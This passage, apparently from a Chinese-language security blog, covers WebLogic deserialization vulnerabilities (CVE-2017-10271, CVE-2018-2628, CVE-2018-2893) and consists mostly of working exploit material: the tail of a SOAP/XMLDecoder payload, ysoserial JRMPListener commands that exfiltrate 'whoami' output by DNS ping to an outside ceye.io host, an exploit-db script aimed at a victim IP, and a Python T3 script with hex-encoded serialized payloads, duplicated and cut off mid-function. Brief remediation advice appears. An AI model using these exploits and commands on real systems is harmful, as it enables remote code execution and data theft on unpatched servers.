class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;array&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;java&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Body&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span></pre></td></tr></table></figure><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p> 根据实际环境路径，删除WebLogicwls-wsat组件；删除相关文件后重启weblogic，保证访问wls-wsat/提示404错误； </p><p>  Oracle下载相关10271补丁</p><h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><h2 id="version-1"><a href="#version-1" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Weblogic 10.3.6.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Weblogic 12.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Weblogic 12.2.1.2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Weblogic 12.2.1.3</span></pre></td></tr></table></figure><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>poc1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 &quot;ping -c1 &#96;whoami&#96;.lfagoh.ceye.io&quot;</span></pre></td></tr></table></figure><p>或poc2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(JRE 版本小于等于 1.7u21)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar  ysoserial.exploit.JRMPListener [listen port] Jdk7u21  &quot;ping -c1 &#96;whoami&#96;.lfagoh.ceye.io&quot;</span></pre></td></tr></table></figure><p>之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;multiple&#x2F;remote&#x2F;44553.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] JRMPClient</span></pre></td></tr></table></figure><h2 id="绕过补丁（cve-2018-2893）"><a href="#绕过补丁（cve-2018-2893）" class="headerlink" title="绕过补丁（cve-2018-2893）"></a>绕过补丁（cve-2018-2893）</h2><p>检测脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!env python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">VUL&#x3D;[&#39;CVE-2018-2893&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">#remote ip changed to :127.0.0.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">PAYLOAD&#x3D;[&#39;ACED0005737200257765626C6F6769632E6A6D732E636F6D6D6F6E2E53747265616D4D657373616765496D706C6B88DE4D93CBD45D0C00007872001F7765626C6F6769632E6A6D732E636F6D6D6F6E2E4D657373616765496D706C69126161D04DF1420C000078707A000001251E200000000000000100000118ACED0005737D00000001001A6A6176612E726D692E72656769737472792E5265676973747279787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707732000A556E696361737452656600093132372E302E302E310000F1440000000046911FD80000000000000000000000000000007878&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">VER_SIG&#x3D;[&#39;StreamMessageImpl&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">def t3handshake(sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">def buildT3RequestObject(sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">def sendEvilObjData(sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">        while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">            res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">            time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">        pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">def checkVul(res,server_addr,index):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    p&#x3D;re.findall(VER_SIG[index], res, re.S)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">    if len(p)&gt;0:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">        print &#39;%s:%d is vul %s&#39;%(server_addr[0],server_addr[1],VUL[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        print &#39;%s:%d is not vul %s&#39; % (server_addr[0],server_addr[1],VUL[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">def run(dip,dport,index):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">    sock.settimeout(15)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    server_addr &#x3D; (dip, dport)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">    t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">    buildT3RequestObject(sock,dport)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">    rs&#x3D;sendEvilObjData(sock,PAYLOAD[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">    #print &#39;rs&#39;,rs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">    checkVul(rs,server_addr,index)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    dip &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">    dport &#x3D; int(sys.argv[2])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">    run(dip,dport,0)</span></pre></td></tr></table></figure><p>利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &quot;localip:localport&quot;  &gt; shell.cer</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  5555 Jdk7u21 &quot;touch &#x2F;tmp&#x2F;a.txt&quot;</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">python weblogic.py [tagetip] [port] shell.cer</span></pre></td></tr></table></figure><p>weblogic.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">#!env python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">VUL&#x3D;[&#39;CVE-2018-2893&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">#remote ip changed to :127.0.0.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">PAYLOAD&#x3D;[&#39;ACED0005737200257765626C6F6769632E6A6D732E636F6D6D6F6E2E53747265616D4D657373616765496D706C6B88DE4D93CBD45D0C00007872001F7765626C6F6769632E6A6D732E636F6D6D6F6E2E4D657373616765496D706C69126161D04DF1420C000078707A000001251E200000000000000100000118ACED0005737D00000001001A6A6176612E726D692E72656769737472792E5265676973747279787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707732000A556E696361737452656600093132372E302E302E310000F1440000000046911FD80000000000000000000000000000007878&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">VER_SIG&#x3D;[&#39;StreamMessageImpl&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">def t3handshake(sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">def buildT3RequestObject(sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(port))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">def sendEvilObjData(sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    